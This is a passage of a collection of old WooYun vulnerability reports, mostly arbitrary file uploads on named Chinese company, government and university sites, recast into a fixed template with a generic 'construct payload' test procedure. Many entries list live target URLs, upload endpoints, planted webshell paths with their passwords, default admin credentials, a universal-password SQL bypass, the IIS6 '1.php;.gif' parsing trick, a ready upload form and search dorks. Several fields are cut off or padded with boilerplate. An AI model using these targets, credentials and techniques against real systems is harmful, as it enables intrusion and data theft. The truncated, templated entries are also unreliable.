**详情**: fck上传地址：http://branch.gdpu.edu.cn/huli/test//admin/FCKeditor/editor/filemanager/connectors/test.html#

**POC**: 恩，不知道这个洞能不能通过啊，上传小马，传个页面

**绕过**: 直接利用

**修复**: 不要问我
---

---
### [wooyun-2013-021868] 江苏卫视I拍拍新闻任意文件上传
**厂商**: 江苏卫视 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 作为江苏人，当然要对江苏卫视的网络安全关心下。稿件上传处没有任何过滤，先传了个jpg的后缀文件，得到其路径，然后用工具检测下webserver，发现是iis6。，然后传个asp的一句话，成功上传。但是问题出现了，asp文件只能下载，不能像图片那样可以查看地址。，想了下，一般这种系统都是把一个用户的传的文件放到一个文件夹下，所以果断替换jpg文件的路径。http://paipai.jstv.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/common/2071894144/201304/201304142354597740.jpg改为http://paipai.jstv.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/common/2071894144/2013

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-045389] 创维某分站引发的一场血案
**厂商**: 创维集团 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先发现后台可以直接访问。。。http://movie.skyworth.com/manager/Default.aspx进入后台之后，看了下后台功能发现了一个首页焦点图的功能然后看到有一个上传图片的地方，再看看服务器iis 版本号，6.0 利用解析漏洞，直接传了一句话。菜刀连接成功。然后发现底下有多个站点目录，经查询发现一个叫http://www.okshe.com/还有应该是其分站

**POC**: 网站整体目录结构数据库连接

**绕过**: 直接利用

**修复**: 升级iis ，代码加上检测文件格式。后台不知道为啥可以直接登。好好检查一下代码。
---

---
### [wooyun-2012-016420] 万达某分站严重漏洞
**厂商**: 大连万达集团股份有限公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: FCKeditor编辑器上传jsp文件，直接导致分站https://zhaopin.wanda.cn沦陷亲，是root权限哦~~·

**POC**: https://zhaopin.wanda.cn/FCKeditor/editor/fckeditor.html

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0156609] 荆门市工商行政管理局东宝分局发现任意一句话木马
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/plus/mytag_js.php?aid=1id号码等于什么 密码就是什么一句话生成

**POC**: http://**.**.**.**/plus/mytag_js.php?aid=1id号码等于什么 密码就是什么一句话生成

**绕过**: 直接利用

**修复**: 0.0
---

---
### [wooyun-2014-074392] 某医院管理系统图片上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 

**元思考**: 触发信号: 上传功能

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过图片上传漏洞上传一句话图片马，iis6解析1.php;.gif执行马

**POC**: googel搜索关键字inurl:website/html/?163.htmlwebsite/html/?161.htmlcompany/html/129.htmljavascript:void(0)eweb/html/?181.htmlwebsite/class/产品名称 医院网站简体版网站制作系统 捆绑软件 医院网站简体版http://www.tweb.tw/建立试用网站，利用iis6的解析漏洞1.php;.gif上传图片一句话进入管理后台http://web.tweb.tw/chenjs(注册的用户)/adm/index.phpwebmaster你注册的用户名上传后文件通用地址http:

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0104863] 某数字化校园平台通用任意文件上传
**厂商**: Cncert国家互联网应急中心 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:BasePlate/LoginCenter/

**POC**: http://pyxx.mhedu.sh.cn/GoodoWebEdit/ftb.insertFile.aspxhttp://www.jincai.sh.cn/GoodoWebEdit/ftb.insertFile.aspxhttp://mail.yanji.edu.sh.cn/oa//GoodoWebEdit/ftb.insertFile.aspxhttp://www.ygxx.hpe.cn/GoodoWebEdit/ftb.insertFile.aspxhttp://www.psjm.pudong-edu.sh.cn/GoodoWebEdit/ftb.insertFile.aspxhttp

**绕过**: 直接利用

**修复**: 删除没必要的文件
---

---
### [wooyun-2015-0103106] 浙江省某市敏感部门系统存在任意文件上传漏洞导致服务器沦陷
**厂商**: 公安部研究所 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天看乌云上面公告，最新一条：乌云新增公共安全合作机构通告，印象里政府网站漏洞都比较多，现在有公安专门加入，希望网络安全早日普及

**POC**: mask 区域*****安全合作机构通告，公^**********d0eea3296c6239a7562721.jpg**********^了^**********5eb94f953aff44c84043d2.jpg**********^找到一^**********6ae1b27d41ac37756a7117.jpg**********c6243e216239629552a9ef.jpg**********3d4255bab1a73cf0742ad9.jpg**********cda950bef2ee28a0f9086f.jpg**********70e44af523da13c78a1e73.

**绕过**: 直接利用

**修复**: 上传过滤
---

---
### [wooyun-2015-0121599] 第一视频某处可任意文件上传
**厂商**: 第一视频 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://passport.v1.cn/edit/userinfo/uploaduserfacestep2.do未对文件名校检  可上传任意文件（虽然对php jsp 之类的不解析 但是可下载 而且可以上传exe···然后你懂得 可上传远控木马 以及病毒文件等）点击浏览  这里我先选个 html 上传（里面就写个弹框）我们点击浏览 然后上传（这里为了方便 我用了Burp 来截获发送以及返回的数据）http://passport.v1.cn/userupload/5025995.html  这里说明下 5025995 是你的用户ID 也就是说 不管你是上传什么类型的文件  这个是不变的  而且不同的类型的文件独立存在 比如 等会上传的 exe 连接就是   http://passport.v1.cn/userupload/5025995.exe 而你再打开 html的连接 也是不一样的 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 任意文件上传  利用的好的话  也可以很厉害的
---

---
### [wooyun-2010-0910] 支付宝一处上传过滤缺陷
**厂商**: 支付宝 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <html><body><meta http-equiv="refresh" content="0.0;url=http://login.taotao.com.auctleom-htm.co.cc/memeber/item_0db1-25078006/&cid=&url=832432.html"></body></html>这段代码 伪造成png文件。访问该png，会跳转到 http://login.taotao.com.auctleom-htm.co.cc/memeber/item_0db1-25078006/&cid=&url=832432.html这个比较简单，请看漏洞证明！

**POC**: http://img.alipay.com/images/credit/2088002/621/657/054/shanghai_credit_report.png打开可以看到 虽然要跳转的站访问不了 但是确实存在跳转。具体的利用 期待高手继续探究。没有找到具体的上传地方，只找到支付宝头像修改 上传后有类似的图片链接！

**绕过**: 直接利用

**修复**: 找到此上传地方，做好过滤限制！
---

---
### [wooyun-2015-0113595] 中国科学院某局OA存在文件上传漏洞
**厂商**: 中国科学院 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址:http://bbr.cashq.ac.cn:8080/<form enctype="multipart/form-data" action="http://bbr.cashq.ac.cn:8080/general/vmeet/wbUpload.php?fileName=1.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>http://bbr.cashq.ac.cn:8080/general/vmeet/wbUpload/1.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: x
---

---
### [wooyun-2013-028188] 安踏某分站任意文件上传，疑似已被入侵
**厂商**: anta.com | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Fckeditor上传，二次上传是不可以了，<=2.6.4那个exp也没成功，看了下现在权限控制做的不错了没的搞了，但是发现以前被人成功上传了PHP文件，这个应该是win空格那个方法传上去的，你们自查下服务器吧。http://en.anta.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://en.anta.com/fckeditor/editor/filemanager/connectors/php/connector.php上传的文件地址：http://en.anta.com/file/image/fuce.php

**POC**: Fckeditor上传，二次上传是不可以了，<=2.6.4那个exp也没成功，看了下现在权限控制做的不错了没的搞了，但是发现以前被人成功上传了PHP文件，这个应该是win空格那个方法传上去的，你们自查下服务器吧。http://en.anta.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://en.anta.com/fckeditor/editor/filemanager/connectors/php/connector.php上传的文件地址：http://en.an

**绕过**: 直接利用

**修复**: 自查服务器。
---

---
### [wooyun-2015-0132099] 伊利某后台弱口令+后台任意文件上传
**厂商**: yili.com | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.tofer.com.cnhttp://tofer.yili.com/两个域名，不知道是不是指向同一个站。。。后台地址http://tofer.yili.com/admin账号admin 密码123456进后台可上传任意文件弱弱问一句。马上传之后再哪个目录。找半天没找到

**POC**: http://www.tofer.com.cnhttp://tofer.yili.com/两个域名，不知道是不是指向同一个站。。。后台地址http://tofer.yili.com/admin账号admin 密码123456进后台可上传任意文件弱弱问一句。马上传之后再哪个目录。找半天没找到

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-038067] 考试通漏洞系列3-某处任意文件上传致官网再次沦陷
**厂商**: 考试通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册一个帐号，登录系统发现个人设置里面可上传图片直接抓包，上传成功前面说了，img.kstong.net下能够直接读取jsp文件源代码然后还说了，img和www在同一台物理机器上面，soso，官网再次沦陷了

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 校验不严格呀
---

---
### [wooyun-2015-0103892] 搜狐某站存在任意文件上传漏洞（半成品）
**厂商**: 搜狐 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜狐某站存在任意文件上传漏洞   （半成品）

**POC**: 漏洞站点：http://changyan.sohu.com/install/import漏洞出现在安装功能的评论导入那里要求上传必须为zip压缩包格式   在这里我们建立一个压缩包然后建立一个文件夹里面放入我们的php一句话接下来我们上传试试看地址：http://changyan.sohu.com/install/import/log/90e03525-d6d6-4c77-83ce-4d16fd60bbfb不出意外的话  我们的一句话已经被解压出来   但是不知道文件传到哪里去了  着实郁闷如果这样构不成危害的话  不要紧   我们还有一种方法  直接上传PHP文件首先我们先直接上传我们的ph

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2012-015290] anwsion最新版本任意上传漏洞(通杀所有。。。)
**厂商**: anwsion.com | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传附件地方没有好好处理文件后缀问题:判断的是文件头没有判断后缀问题。。。。。。。。

**POC**: http://wenda.anwsion.com/uploads/questions/20121126/e826a3e05a4beb6c24373ba014fe39f8.php pass合并图片一句话木马成功~！！！！！http://wenda.anwsion.com/robots.txt

**绕过**: 直接利用

**修复**: 判断文件后缀,限制jpg png gif 等后缀其他的后缀 直接随机算法加密！！！！！
---

---
### [wooyun-2015-0101394] 某企业建站程序多个通用漏洞影响大量网站
**厂商**: 西安惠天网络科技有限公司 | **年份**: 2015 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 西安惠天网络科技有限公司建站程序存在多项漏洞：建站弱口令、搜索型注入、后台POST注入、后台万能密码绕过、权限绕过、后台任意文件上传

**POC**: 西安惠天网络科技有限公司建站程序存在多项漏洞：建站弱口令、搜索型注入、后台POST注入、后台万能密码绕过、权限绕过、后台任意文件上传建站案例：http://www.xagoto.com/?mid=1&catid=大量用户网站存在建站弱口令 统一账号密码为：admin    admin5218后台万能密码：admin' or 'a'='a   可通杀部分网站后台POST注入：影响不大的漏洞就不给予演示了,直接演示新漏洞（此漏洞可通杀  简单、方便、直接、便捷）后台数据库备份处未验证Cookie导致越权访问,可直接备份数据库http://www.sxxingli.com/admin/databak

**绕过**: 过滤绕过

**修复**: 修复
---

---
### [wooyun-2013-027579] 中兴通讯股份有限公司某站点任意文件上传漏洞
**厂商**: 中兴通讯股份有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.首先说下，我传了一直找不到路径，坑死了，技术问题啊2.地址：http://www3.zte.com.cn/datachange/file_upload.jsp?SelfControl=1&ShowText=1&AllowExt=rar,zip&InputName=&BgColor=然后还有http://www2.zte.com.cn/datachange/file_upload.jsp?SelfControl=1&ShowText=1&AllowExt=rar,zip&InputName=&BgColor=我也没去看是不是同一个IP地址我看的是在客户端验证的，然后我就直接burp suite修改文件后缀名，然后成功上传啦没有找到地址路径，不过还是存在的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 一切在客户端的验证都是危险的
---

---
### [wooyun-2015-0106419] 某市广电网上营业厅远程代码执行
**厂商**: 厦门广电网络 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Jboss JMX/EJBInvokerServlet 漏洞实例pay.xmbtn.comhttp://www.xmbtn.com/pay/index.html

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 全市用户  还有在线充值接口  影响还是挺大的
---

---
### [wooyun-2015-094981] 驴妈妈API设计错误导致主站任意文件上传
**厂商**: 驴妈妈旅游网 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、在客户端中抓取上传头像地址。2、任意文件上传，只要修改一下文件名和内从就好了，这里只上传一个txt,content:just test3、上传成功得到response，查看地址。4、打开页面http://www.lvmama.com/uploads/header/3428a92f4b3ad5fb014b41151e090091.txt

**POC**: http://www.lvmama.com/uploads/header/3428a92f4b3ad5fb014b41151e090091.txt

**绕过**: 直接利用

**修复**: 对于上传的文件类型进行限制就好了~
---

---
### [wooyun-2015-094829] 电子工业出版社任意文件上传
**厂商**: 电子工业出版社 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件上传地址http://www.phei.com.cn/module/zygl/manager/uploadpic.jsp?option=upload可以上传jsp文件测试文件http://www.phei.com.cn/module/zygl/manager/uploadfiles/Browser.jsp无需密码登录可看~

**POC**: 详细说明已说。

**绕过**: 直接利用

**修复**: 建议删除上传文件。
---

---
### [wooyun-2013-020865] 91助手分站上传漏洞
**厂商**: 福建网龙 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 好吧！我承认我是冲礼物来的。。分站：http://market.sj.91.com/选择扫描件上传：只有本地验证。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个修复简单吧。。验证一下。。。
---

---
### [wooyun-2015-0116306] 武汉地铁工程某系统任意文件上传
**厂商**: 武汉地铁 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 武汉地铁工程安全预警系统：http://hs.whrt.gov.cn/safemanager/login.doFCK编辑器：http://hs.whrt.gov.cn/safemanager/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector可上传任意文件类型的文件。。。。上传是成功的 ，但是好像是限制了上传目录需登陆权限。。不再继续，点到为止！

**POC**: 武汉地铁工程安全预警系统：http://hs.whrt.gov.cn/safemanager/login.doFCK编辑器：http://hs.whrt.gov.cn/safemanager/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector可上传任意文件类型的文件。。。。上传是成功的 ，但是好像是限制了上传目录需登陆权限。。不再继续，点到为止！

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2013-026140] 北京电信通云主机第二次首页被入侵
**厂商**: 电信通 | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无意间看见WooYun: 北京电信通云主机事业部代理商任意文件上传漏洞,可导致内部/用户敏感信息泄漏大牛好吊。。。额  手贱了 扫描下————我擦  各种目录遍历  我去然后一个一个看。。。。貌似我懂得前辈怎么进去的了：http://www.yunhosting.net/UserFiles/     然后http://www.yunhosting.net/UserFiles/e.asp;.jpg  爆破：123456   那个1.rar经判断改后缀mdb由此我们判断前辈是靠解析漏洞传上去的   并存在弱口令   看漏洞类型大牛并没有发现此站存在目录遍历  而是仅通过代码审计之类首页已备份index1.asp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不懂
---

---
### [wooyun-2015-0115988] 湖北省交通运输管理局某一监控地址执行命令漏洞
**厂商**: 湖北省交通运输管理局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: img.hbys.gov.cn/CMShbys/201410/201410110438054.docTarget: http://218.200.68.58:3003/login.actionUseage: S2-016Whoami: svctag-9245f3x\hbtdadminWebPath: D:\goss_web_v8.0.0.17896.20130509\goss_web\goss_webapp\webapps\ROOT\=================================================================================

**绕过**: 直接利用

**修复**: 打补丁，升级
---

---
### [wooyun-2014-074607] 从看片中发现蛛丝马迹最终发现电信某省某系统弱口令存在任意上传
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 服务弱口令

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 四川电信移动受理系统#短片位置http://agent.sc.189.cn/apk/#短片http://agent.sc.189.cn/apk/%cb%c4%b4%a8%b5%e7%d0%c5%d2%c6%b6%af%ca%dc%c0%ed%cf%b5%cd%b3%ba%f3%cc%a8%c5%e4%d6%c3%b2%d9%d7%f7%c5%e0%d1%b5%ca%d3%c6%b50602.wmv＃看片时间1:49   url出现锁定：http://61.188.4.249:8080/时间2:51 输入用户名 10001随后输入了五位密码，五位就好办了试了admin...最后弱口令帝试了试，12345进来了。。账户10001密码12345的http://61.188.4.249:8080/chengdu/login.actionhttp://61.188.4.249:8080/4g/log

**POC**: 还能查看订单等等。

**绕过**: 直接利用

**修复**: 你们更懂
---

---
### [wooyun-2015-0112306] 中国通信服务福建公司某系统编辑器弱口令致任意文件上传
**厂商**: 中国通信服务福建公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标地址：http://www.fjccs.com.cn/福建省通信产业服务有限公司编辑器地址：http://www.fjccs.com.cn/eWebEditor_aspx/admin/login.aspx帐号密码：admin/admin

**POC**: 目录遍历：http://www.fjccs.com.cn/eWebEditor_aspx/admin/upload.aspx?id=2&dir=../拿shell过程就不多说了一句话地址：http://www.fjccs.com.cn/eWebEditor_aspx/uploadfile/20150505225512382.aspx密码：abcd

**绕过**: 直接利用

**修复**: 强口令
---

---
### [wooyun-2015-0133347] 途牛旅游某站存在svn源代码泄露（可上传任意文件到cdn）
**厂商**: 途牛旅游网 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 途牛旅游两个站点存在svn源代码泄露，通过泄露的源代码，可找到系统文件上传脚本路径，通过文件上传，可上传任意文件到tuniucdn服务器。

**POC**: 源代码泄露http://metro.tuniu.com/.svn/entrieshttp://weather.tuniu.com/.svn/entries泄露了php脚本的路径和部分敏感信息可以找到一个文件上传脚本本地写一个提交页面把链接弄进去:可以上传任意文件到http://metro.tuniu.com/该服务器传了很多类型的文件，都无法解析执行，拿不到shell。。。。应该是做了安全设置可以上传的点：http://metro.tuniu.com/SWFUpload/upload.phphttp://weather.tuniu.com/SWFUpload/upload.phphttp://

**绕过**: 直接利用

**修复**: 修改svn代码泄露，在上传这块加个过滤。。
---

---
### [wooyun-2014-048516] 信游科技页游平台程序通用型文件上传，可攻陷多个主流网页游戏平台
**厂商**: 52xinyou.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官方案例：http://52xinyou.cn/anli.htm从案例里面选了12玩 http://www.12wan.com 做例子，其它雷同（个别有狗）api里的upload.ashx文件产生的问题。

**POC**: 地址：http://www.12wan.com/api/Upload.ashx……extTable.Add("image", "gif,jpg,jpeg,png,bmp");extTable.Add("flash", "swf,flv");extTable.Add("apw", "apw");extTable.Add("media", "swf,flv,mp3,mp4,wav,wma,wmv,mid,avi,mpg,asf,rm,rmvb");extTable.Add("file", "cs,doc,ppt,pptx,docx,xls,xlsx,ppt,htm,html,txt,zip,rar

**绕过**: 直接利用

**修复**: var fname = uploadPath + "\\" + Utility.NowTime.ToString("HHmmss", DateTimeFormatInfo.InvariantInfo) + file.FileName;后面file.FileName采用随机化的文件名并注意使用后缀的白
---

---
### [wooyun-2015-0116551] 某市敏感单位某系统存在任意文件上传漏洞
**厂商**: 某市敏感单位 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mask 区域1.://**.**.**//www.ga.xm.gov.cn:3388/was2/xmsga/jsp/module/user/user_login.jsp_*****3bcb39e1c98a.jpg" alt=&quo**********得先注^**********^了12条，无限制，可抓包重发，**********db7049007566.png" alt=&quo**********71c30d506c75.jpg" alt=&quo*****

**POC**: mask 区域*****^存在文件上^**********689772ca0bbb.jpg" alt=&quo**********3a9c3689104b.jpg" alt=&quo**********^件^**********^，即可上传jsp^**********5ccf6ddcc858.jpg" alt=&quo*****1.http://**.**.**/was2/washttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/173958_wooyun.jsp_*****0c7ba174ff9c.jpg" alt=&quo******

**绕过**: 直接利用

**修复**: 上传点过滤,短信发送加验证码限制次数
---

---
### [wooyun-2013-032755] 0515地产网的一个文件上传漏洞（编辑器漏洞利用技巧）
**厂商**: 0515地产家居网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件上传的链接：http://www.house0515.com/common/lib/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php由于上传的类型要用Media，而页面中没有这个类型，所以要自己构造请求头exp:url_add  = '/common/lib/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php'url_param = '?Type=Media'data = ('------WebKitFormBoundaryMYPME809NpNklyB5''Content-Disposition: fo

**POC**: 用菜刀链接，结果如下

**绕过**: 直接利用

**修复**: 升级，最新版本的已经修复了这个漏洞
---

---
### [wooyun-2014-079055] 草根网存在上传漏洞
**厂商**: 草根网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: FCK编辑器能扫能爆，居家旅行必备哟！

**POC**: 漏洞证明http://www.20ju.com/data/userfiles/file/hacked101521.txt

**绕过**: 直接利用

**修复**: 你们比我更专业！
---

---
### [wooyun-2014-060016] 无锡地铁官网任意文件上传
**厂商**: 无锡地铁官网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通元建站系统的老问题访问：http://www.wxmetro.net:8888/cms/editor/filemanager/browser/default/browser.html?Type=../../../webapps/cms&Connector=connectors/jsp/connector可上传jsp文件

**POC**: 传的后门http://www.wxmetro.net:8888/cms/job.jsp密码：654321因为我是无锡人，希望这个网站改善下

**绕过**: 直接利用

**修复**: 参考网上的方法
---

---
### [wooyun-2014-089474] 协同OA任意上传0day
**厂商**: seeyon.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 协同OA文件上传时都调用一个Action，那就是fileUpload.do。架构使用了Spring，所以，在服务上这个http://***.com/fileUpload.do文件是不存在的，要找到他对应的类，然后反编译才可以看到源码。通过web.xml，找到了urlMapping.xml，这个XML中可以找到一系类的URL映射文件，比如fileUpload.do映射到了现在再找到fileUploadController就可以找到与之相对应的类了。文件上传下载一般属于公用组件，所以找到了common-controller.xml。在这个里面找到类。终于找到类了，下载下来class然后反编译吧，看代码。com.seeyon.v3x.common.fileupload.FileUploadController 反编译后的源码如下：public ModelAndView processUpload

**POC**: 还有另外一种方式，就是传如绝对路径，依然可以搞定，代码中有体现，就不过多说了。。

**绕过**: 直接利用

**修复**: 换个过滤机制。
---

---
### [wooyun-2012-06852] 泡泡网某子站任意文件上传
**厂商**: 泡泡网 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
